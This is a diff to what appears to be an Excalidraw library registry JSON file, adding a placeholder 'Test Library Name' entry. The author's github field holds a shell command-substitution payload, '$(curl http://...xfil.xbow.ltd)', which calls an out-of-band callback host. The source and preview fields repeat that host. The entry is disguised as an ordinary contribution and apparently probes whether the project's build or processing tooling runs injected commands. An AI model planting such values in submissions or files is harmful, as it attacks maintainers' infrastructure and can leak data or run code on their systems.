@@ -7243,5 +7243,25 @@
       "WSI cytology",
       "WSI histology"
     ]
+  },
+  {
+    "name": "Test Library Name",
+    "description": "A test library for Excalidraw",
+    "authors": [
+      {
+        "name": "Test Author",
+        "github": "https://github.com/$(curl http://d1cudp2i2hlc664a8prgy4ozx4w9afuf3.xfil.xbow.ltd)",
+        "twitter": "https://twitter.com/testuser",
+        "url": "https://example.com"
+      }
+    ],
+    "source": "curl-http-d1cudp2i2hlc664a8prgy4ozx4w9afuf3-xfil-xbow-ltd/test-library-name.excalidrawlib",
+    "preview": "curl-http-d1cudp2i2hlc664a8prgy4ozx4w9afuf3-xfil-xbow-ltd/test-library-name.png",
+    "created": "2025-06-23",
+    "updated": "2025-06-23",
+    "version": 2,
+    "itemNames": [
+      "Test Item"
+    ]
   }
 ]
